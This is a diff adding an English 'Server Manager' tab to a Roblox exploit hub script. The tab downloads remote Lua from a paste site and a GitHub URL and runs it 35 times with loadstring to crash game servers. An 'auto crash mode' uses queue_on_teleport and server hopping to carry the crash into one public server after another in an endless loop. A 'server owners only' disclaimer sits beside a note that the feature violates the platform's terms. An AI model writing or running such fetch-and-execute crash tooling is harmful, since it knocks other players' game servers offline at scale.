@@ -4563,6 +4563,291 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [EN]: Server Manager（英語版）
+-- 攻撃系タブ（ブロック31）の直後に挿入
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+
+    -- ========================================================================
+    -- Constants
+    -- ========================================================================
+    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- Standalone crash (35 runs)
+    local AUTOLOGIC_URL = "https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/server-crash"  -- Infinite loop
+    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
+    local CRASH_LOOP_COUNT = 35
+
+    -- ========================================================================
+    -- HTTP fetch
+    -- ========================================================================
+    local function safeHttpGet(url)
+        if type(game.HttpGet) == "function" then
+            return game:HttpGet(url)
+        elseif type(HttpGet) == "function" then
+            return HttpGet(url)
+        elseif type(game.HttpGet) == "function" then
+            return game.HttpGet(game, url)
+        end
+        error("HttpGet not available in this environment")
+    end
+
+    -- ========================================================================
+    -- Chat send (2 methods: TextChatService + Legacy)
+    -- ========================================================================
+    local function sendChatMessage(message)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            pcall(function()
+                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+                gc:SendAsync(message)
+            end)
+        end
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local smr = events:FindFirstChild("SayMessageRequest")
+            if smr then
+                pcall(function() smr:FireServer(message, "All") end)
+            end
+        end
+    end
+
+    -- ========================================================================
+    -- Run crash script (standalone, 35 times)
+    -- ========================================================================
+    local function runCrashScript()
+        local ok, err = pcall(function()
+            local scriptContent = safeHttpGet(CRASH_URL)
+            for i = 1, CRASH_LOOP_COUNT do
+                pcall(function()
+                    loadstring(scriptContent)()
+                end)
+                task.wait(0.1)
+            end
+        end)
+        return ok, err
+    end
+
+    -- ========================================================================
+    -- Get another server's JobId
+    -- ========================================================================
+    local function getAnotherServerJobId()
+        local ok, result = pcall(function()
+            local url = string.format(
+                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
+                game.PlaceId
+            )
+            return HttpService:JSONDecode(safeHttpGet(url))
+        end)
+        if ok and result and result.data then
+            local currentJobId = game.JobId
+            for _, server in ipairs(result.data) do
+                if server.id and server.id ~= currentJobId then
+                    return server.id
+                end
+            end
+        end
+        return nil
+    end
+
+    -- ========================================================================
+    -- Teleport
+    -- ========================================================================
+    local function teleportToAnotherServer()
+        local targetJobId = getAnotherServerJobId()
+        local localPlayer = Players.LocalPlayer
+        if targetJobId then
+            local ok = pcall(function()
+                local opts = Instance.new("TeleportOptions")
+                opts.ServerInstanceId = targetJobId
+                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
+            end)
+            if ok then return true end
+        end
+        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
+        return false
+    end
+
+    -- ========================================================================
+    -- Countdown (single run)
+    -- ========================================================================
+    local function runCountdownOnce(onFinish)
+        task.spawn(function()
+            pcall(function() sendChatMessage(CHAT_HEADER) end)
+            task.wait(0.8)
+            pcall(function() sendChatMessage("5") end) task.wait(1)
+            pcall(function() sendChatMessage("4") end) task.wait(1)
+            pcall(function() sendChatMessage("3") end) task.wait(1)
+            pcall(function() sendChatMessage("2") end) task.wait(1)
+            pcall(function() sendChatMessage("1") end)
+            if onFinish then onFinish() end
+        end)
+    end
+
+    -- ========================================================================
+    -- queue_on_teleport support check
+    -- ========================================================================
+    local function hasQueueOnTeleport()
+        return (type(queue_on_teleport) == "function")
+            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
+    end
+
+    local function callQueueOnTeleport(script)
+        if type(queue_on_teleport) == "function" then
+            return pcall(function() queue_on_teleport(script) end)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+            return pcall(function() syn.queue_on_teleport(script) end)
+        end
+        return false
+    end
+
+    -- ========================================================================
+    -- Create tab
+    -- ========================================================================
+    local CrashTab = Window:MakeTab({
+        Name = "Server Manager",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ Do not abuse",
+        "Test feature for server owners.\n" ..
+        "Do not run on other people's servers."
+    )
+
+    CrashTab:AddSection({ Name = "Test Execution" })
+
+    -- ========================================================================
+    -- ① Standalone (crash test)
+    --    Only runs sPciZuXM 35 times. No teleport.
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⚡ Server Crash Test (standalone, 35 consecutive runs)",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "Standalone Crash Test",
+                Content = "Starting 35 consecutive runs...",
+                Time = 3
+            })
+            task.spawn(function()
+                local ok, err = runCrashScript()
+                if ok then
+                    PlayActionSound()
+                    OrionLib:MakeNotification({
+                        Name = "Complete",
+                        Content = "Finished 35 runs",
+                        Time = 5
+                    })
+                else
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Error",
+                        Content = "Failed: " .. tostring(err),
+                        Time = 5
+                    })
+                end
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- ② Auto infinite mode
+    --    1st run (this server):
+    --      Countdown → queue server-crash on queue_on_teleport
+    --      Fire teleport → run sPciZuXM (35 times) on this server
+    --    2nd+ (new server):
+    --      server-crash auto-loads → countdown · crash · teleport · self-queue
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔁 Auto Crash Mode (infinite loop)",
+        Callback = function()
+            PlayActionSound()
+
+            if not hasQueueOnTeleport() then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "❌ Cannot Execute",
+                    Content = "This executor does not support queue_on_teleport. Infinite loop is not possible.",
+                    Time = 8
+                })
+                return
+            end
+
+            OrionLib:MakeNotification({
+                Name = "🔁 Auto Mode",
+                Content = "Starting countdown → this server will also run 35 crash runs",
+                Time = 3
+            })
+
+            runCountdownOnce(function()
+                -- Queue server-crash (URL load only) for the next server
+                local nextScript = string.format([[
+loadstring(game:HttpGet("%s"))()
+]], AUTOLOGIC_URL)
+                local ok = callQueueOnTeleport(nextScript)
+                if not ok then
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Error",
+                        Content = "Failed to queue on queue_on_teleport",
+                        Time = 4
+                    })
+                    return
+                end
+
+                -- Fire teleport first (so it is not affected by crash)
+                task.spawn(function() teleportToAnotherServer() end)
+                task.wait(0.1)
+
+                -- Also run sPciZuXM (35 times) on this server
+                task.spawn(function()
+                    local crashOk = runCrashScript()
+                    if crashOk then
+                        PlayActionSound()
+                        OrionLib:MakeNotification({
+                            Name = "First Crash Run",
+                            Content = "server-crash queued · Moving to another server",
+                            Time = 4
+                        })
+                    else
+                        PlayErrorSound()
+                    end
+                end)
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- Information
+    -- ========================================================================
+    CrashTab:AddSection({ Name = "Information" })
+    CrashTab:AddParagraph(
+        "Usage",
+        "① Standalone: runs sPciZuXM 35 times (completes on this server)\n" ..
+        "② Auto infinite: countdown → queue server-crash → fire teleport → run 35 crash runs on this server\n" ..
+        "   After arriving on the new server, server-crash automatically performs countdown · crash · teleport · self-queue,\n" ..
+        "   creating an infinite loop."
+    )
+    CrashTab:AddParagraph(
+        "URLs Used",
+        "・Standalone Crash: " .. CRASH_URL .. "\n" ..
+        "・Infinite Loop: " .. AUTOLOGIC_URL
+    )
+    CrashTab:AddParagraph(
+        "Notes",
+        "・Executors without queue_on_teleport cannot run the infinite loop\n" ..
+        "・If public servers run out, Teleport() fallback is used\n" ..
+        "・Continuous teleport + crash violates Roblox ToS (at your own risk)"
+    )
+end
+
+-- ============================================================================
 -- Block 32: Hijack Train Tab
 -- ============================================================================
 do
